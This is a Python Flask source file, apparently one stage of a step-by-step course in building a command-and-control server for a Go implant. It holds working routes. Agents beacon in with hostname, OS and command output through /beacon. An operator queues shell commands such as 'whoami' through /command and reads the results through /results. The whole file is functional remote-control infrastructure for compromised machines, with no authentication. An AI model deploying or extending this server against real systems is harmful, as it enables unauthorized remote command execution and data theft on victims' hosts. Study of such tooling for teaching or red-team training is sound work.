"""
SERVER — Stage 06 (Interactive Command Input via Flask Route)

Matches: agent/stages/stage06_with_command_input_on_server.go

What this adds:
- /command POST route so operator queues tasks via HTTP (not terminal input)
- Simple web-based command dispatch
- /agents GET route to list connected agents
"""

from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

agents  = {}
tasks   = {}
results = {}

# ── Agent-facing ──────────────────────────────────────────────

@app.route("/beacon", methods=["POST"])
def beacon():
    data     = request.get_json()
    agent_id = data.get("agent", "unknown")

    agents[agent_id] = {
        "hostname":  data.get("hostname", "?"),
        "os":        data.get("os", "?"),
        "status":    data.get("status", "unknown"),
        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    if data.get("output"):
        results[agent_id] = data["output"]
        print(f"\n[OUTPUT from {agent_id}]\n{data['output']}\n{'='*40}")

    task = tasks.pop(agent_id, None)
    return jsonify({"task": task or ""})

# ── Operator-facing ────────────────────────────────────────────

@app.route("/agents", methods=["GET"])
def list_agents():
    return jsonify(agents)

@app.route("/command", methods=["POST"])
def queue_command():
    """
    POST /command
    Body: {"agent": "go-agent", "cmd": "whoami"}
    """
    data     = request.get_json()
    agent_id = data.get("agent")
    cmd      = data.get("cmd")

    if not agent_id or not cmd:
        return jsonify({"error": "agent and cmd required"}), 400

    tasks[agent_id] = cmd
    print(f"[*] Task queued for {agent_id}: {cmd}")
    return jsonify({"queued": True})

@app.route("/results", methods=["GET"])
def get_results():
    return jsonify(results)

if __name__ == "__main__":
    print("[*] Stage 06 server started on http://127.0.0.1:8080")
    print("[*] Queue a command: POST /command  {agent, cmd}")
    app.run(host="0.0.0.0", port=8080, debug=False)
